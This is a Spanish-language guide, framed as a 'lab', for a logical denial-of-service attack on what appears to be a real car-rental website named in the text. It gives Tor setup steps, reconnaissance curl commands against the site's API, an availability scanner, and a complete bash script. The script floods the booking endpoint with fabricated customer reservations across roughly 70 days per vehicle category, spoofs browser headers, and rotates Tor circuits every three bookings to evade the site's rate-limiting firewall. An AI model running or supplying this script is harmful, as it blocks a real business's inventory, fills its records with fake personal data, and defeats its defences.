# 🐉 Laboratorio Windows + Tor: Ataque DoS Lógico Avanzado

## Requisitos Previos: Instalación de Tor en Windows

Dado que Windows no tiene un gestor de paquetes como `apt`, configuraremos Tor manualmente usando el **Tor Expert Bundle** y ejecutaremos los ataques desde **Git Bash**.

### 1.1 Descargar y Configurar Tor
1. **Descargar:** Entra a [torproject.org/download/tor/](https://www.torproject.org/download/tor/) y descarga el "Tor Expert Bundle" para Windows.
2. **Extraer:** Descomprime el archivo en tu escritorio (ej: `Desktop/tor-expert-bundle`).
3. **Configurar Control Port:**
   - Abre la carpeta `tor` (donde está `tor.exe`).
   - Crea un archivo de texto llamado `torrc` (sin extensión `.txt`).
   - Abre `torrc` con un editor de texto y pega el siguiente contenido:
     ```text
     SocksPort 9050
     ControlPort 9051
     CookieAuthentication 0
     ```
4. **Ejecutar Tor:** Abre una ventana de `CMD` (Símbolo del sistema), navega a la carpeta de tor y ejecútalo:
   ```cmd
   cd Desktop\tor-expert-bundle\tor
   tor.exe -f torrc
   ```
   *⚠️ Deja esta ventana negra abierta. Es el motor de enrutamiento.*

### 1.2 Configurar variables en Git Bash
Abre **Git Bash** (es obligatorio para los scripts en Bash) y ejecuta:
```bash
export TARGET="https://oceandrivecarental.com/server/public"
export TOR="socks5h://127.0.0.1:9050"
export UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

---

## 2️⃣ RECONOCIMIENTO

### 2.1 Verificar que la red Tor funciona
```bash
echo "Mi IP real: $(curl -s https://api.ipify.org)"
echo "Mi IP via Tor: $(curl -s -x $TOR https://api.ipify.org)"
```

### 2.2 Inspección de Vehículos (Catálogo completo)
```bash
curl -s -x $TOR -H "User-Agent: $UA" "$TARGET/vehicles" | jq '.[] | {id, name, stock, base_price, transmission}'
```

---

## 3️⃣ SCANNER DE DISPONIBILIDAD (Verificación Visual)

Crea y ejecuta un script de diagnóstico rápido para ver qué días están disponibles.

### 3.1 Scanner Rápido de Abril (Script .sh)
Escribe este código en un archivo llamado `diagnostico_abril.sh` y ejecútalo con `bash diagnostico_abril.sh`:

```bash
#!/bin/bash
export TARGET="https://oceandrivecarental.com/server/public"
TOR="socks5h://127.0.0.1:9050"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

echo "=== 🔍 SCANNER ABRIL 2026 (Via Tor) ==="
echo "FECHA      | ECON | COMP | COMP+| SUV  | SUV+"
echo "-----------|------|------|------|------|------"
for i in $(seq 18 30); do
    F="2026-04-$i"; M="2026-04-$((i+1))"
    [ $i -eq 30 ] && M="2026-05-01"
    
    R=$(curl -s -x $TOR -H "User-Agent: $UA" "$TARGET/bookings/availability?start_date=$F&end_date=$M&pickup_time=12:30&dropoff_time=10:00")
    
    S=$(echo "$R" | jq -r 'def c(id): (map(select(.id==id))|.[0].is_available); "\(if c(1) then " ✅ " else " ❌ " end)|\(if c(2) then " ✅ " else " ❌ " end)|\(if c(3) then " ✅ " else " ❌ " end)|\(if c(4) then " ✅ " else " ❌ " end)|\(if c(5) then " ⚠️ " else " ❌ " end)"')
    
    echo "$F |$S"
done
```

---

## 4️⃣ ATAQUE: Operación Asimétrica con Rotación en Windows

*NOTA: En Windows (Git Bash), el comando `nc` (netcat) no viene por defecto. Por ende, usaremos **PHP (fsockopen)**, que ya tienes instalado, para inyectar el comando de rotación directamente en el Control Port de Tor.*

Guarda el siguiente código en un archivo llamado `ataque_windows_tor.sh` y ejecútalo con `bash ataque_windows_tor.sh`.

```bash
#!/bin/bash
# 💣 OPERACIÓN ASIMÉTRICA: DoS Lógico con Rotación Tor NATIVA PARA WINDOWS

export TARGET="https://oceandrivecarental.com/server/public"
TOR="socks5h://127.0.0.1:9050"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

# Límite detectado del WAF defensivo
MAX_POR_IP=3

# Función para rotar IP conectándose al puerto 9051 usando PHP nativo
rotar_tor() {
    php -r '$f=fsockopen("127.0.0.1",9051);if($f){fwrite($f,"AUTHENTICATE \"\"\r\nSIGNAL NEWNYM\r\n");fclose($f);}'
    sleep 3  # Esperar a que la red Tor construya un nuevo circuito
}

NOMBRES=("Andrés Felipe Martínez" "Carolina Mendoza Ruiz" "Juan David Herrera" "María Alejandra Torres" "Santiago López Giraldo" "Valentina Ospina Castro" "Camilo Restrepo" "Laura Daniela Vargas" "Sebastián Morales" "Natalia García" "Felipe Ramírez" "Daniela Mejía" "Julián Henao" "Isabela Cardona" "Mateo Muñoz")
DOMINIOS=("gmail.com" "hotmail.com" "outlook.com" "yahoo.com" "live.com")

echo "🚀 Ataque DoS Lógico via Tor (Infraestructura Windows)"
echo "📊 Rotación automática del circuito Tor cada $MAX_POR_IP reservas"
echo ""

TOTAL=0; OK=0; FAIL=0; CONT_IP=0

for cat in 1 2 3 4; do
    case $cat in
        1) BASE="2026-04-21"; DAYS=71; STOCK=1; TAG="ECONÓMICO" ;;
        2) BASE="2026-04-19"; DAYS=73; STOCK=2; TAG="COMPACTO" ;;
        3) BASE="2026-04-20"; DAYS=72; STOCK=3; TAG="COMPACTO+" ;;
        4) BASE="2026-04-18"; DAYS=74; STOCK=1; TAG="SUV" ;;
    esac

    echo "━━━ CAT $cat ($TAG) desde $BASE | $DAYS días | Stock: $STOCK ━━━"

    for ((d=0; d<DAYS; d++)); do
        # Asegurar compatibilidad multiplataforma quitando retornos de carro (\r)
        START=$(date -d "$BASE +$d days" +%Y-%m-%d | tr -d '\r')
        END=$(date -d "$BASE +$((d+1)) days" +%Y-%m-%d | tr -d '\r')
        DIA_ID=$(date -d "$BASE +$d days" +%m%d | tr -d '\r')

        for ((u=1; u<=STOCK; u++)); do
            TOTAL=$((TOTAL+1))

            # 🔄 Rotar IP cada MAX_POR_IP reservas
            if [ $CONT_IP -ge $MAX_POR_IP ]; then
                echo -n "   🔄 Rotando circuito Tor... "
                rotar_tor
                IP_NUEVA=$(curl -s -x $TOR https://api.ipify.org)
                echo "Nueva IP: $IP_NUEVA"
                CONT_IP=0
            fi
            CONT_IP=$((CONT_IP+1))

            NOMBRE="${NOMBRES[$RANDOM % ${#NOMBRES[@]}]}"
            DOM="${DOMINIOS[$RANDOM % ${#DOMINIOS[@]}]}"
            EMAIL_USER=$(echo "$NOMBRE" | tr '[:upper:]' '[:lower:]' | tr ' ' '.' | tr -d 'áéíóúñÁÉÍÓÚÑ' | cut -d. -f1-2 | tr -d '\r')
            EMAIL="${EMAIL_USER}.${DIA_ID}@${DOM}"
            DOC=$((10000000 + RANDOM % 90000000))
            TEL="+5731$((1000000 + RANDOM % 9000000))"

            echo -n "[*] Cat:$cat $START (U$u) [$CONT_IP/$MAX_POR_IP] $NOMBRE... "

            # Escribir payload limpio de retornos de carro en una sola línea
            printf '{"category_id":%d,"start_date":"%s","end_date":"%s","pickup_location":"Aeropuerto","dropoff_location":"Hotel","pickup_time":"12:30","dropoff_time":"10:00","customerDetails":{"name":"%s","email":"%s","phone":"%s","nationality":"Colombia","doc_type":"CC","doc_number":"%s"}}' \
                "$cat" "$START" "$END" "$NOMBRE" "$EMAIL" "$TEL" "$DOC" > test_payload.json

            RESULT=$(curl -s -x $TOR \
                -X POST "$TARGET/bookings" \
                -H "Content-Type: application/json" \
                -H "User-Agent: $UA" \
                -H "Accept: application/json, text/plain, */*" \
                -H "Accept-Language: es-CO,es;q=0.9" \
                -H "Origin: https://oceandrivecarental.com" \
                -H "Referer: https://oceandrivecarental.com/reservar" \
                -d @test_payload.json)

            MSG=$(echo "$RESULT" | jq -r '.message // .error // "Sin respuesta"' 2>/dev/null)
            if echo "$MSG" | grep -qi "confirmed"; then
                echo "✅ CONFIRMADA"
                OK=$((OK+1))
            elif echo "$MSG" | grep -qi "Polic\|limit\|block"; then
                echo "🚫 IP quemada → Forzando rotación"
                CONT_IP=$MAX_POR_IP
                FAIL=$((FAIL+1))
            else
                echo "⚠️ $MSG"
                FAIL=$((FAIL+1))
            fi

            sleep $(( (RANDOM % 2) + 1 ))
        done
    done
done

rm -f test_payload.json
echo ""
echo "══════════════════════════════════════"
echo "📊 RESULTADOS (Windows + Tor)"
echo "══════════════════════════════════════"
echo "Total:    $TOTAL"
echo "✅ OK:    $OK"
echo "🚫 Fail:  $FAIL"
echo "Éxito:    $(( OK * 100 / (TOTAL > 0 ? TOTAL : 1) ))%"
```

---

## 5️⃣ VERIFICACIÓN Y EXTRACCIÓN 

### 5.1 Verificar Reservas Creadas
Vuelve a ejecutar `bash diagnostico_abril.sh`. Todas las confirmaciones de arriba deberían reflejarse como bloqueos (`❌`) en el stock público.

### 5.2 (Opcional) Extracción Forense
Examina si la base de datos realmente guardó todos los registros falsos para evidenciar la contaminación de datos (Data Degradation):
```bash
curl -s -x $TOR -H "User-Agent: $UA" "$TARGET/vehicles" | jq '.[] | {id, name, stock}'
```

---

## 📋 Resumen de Comandos Rápidos

| Acción | Comando (Git Bash Windows) |
|--------|----------------------------|
| Verificar Tor IP | `curl -s -x socks5h://127.0.0.1:9050 https://api.ipify.org` |
| Rotar IP Manualmente | `php -r '$f=fsockopen("127.0.0.1",9051);fwrite($f,"AUTHENTICATE \"\"\r\nSIGNAL NEWNYM\r\n");fclose($f);'` |
| Ver vehículos | `curl -s -x $TOR -H "User-Agent: $UA" "$TARGET/vehicles" \| jq '.'` |
| Ejecutar Ataque | `bash ataque_windows_tor.sh` |
| Validar Boqueo | `bash diagnostico_abril.sh` |
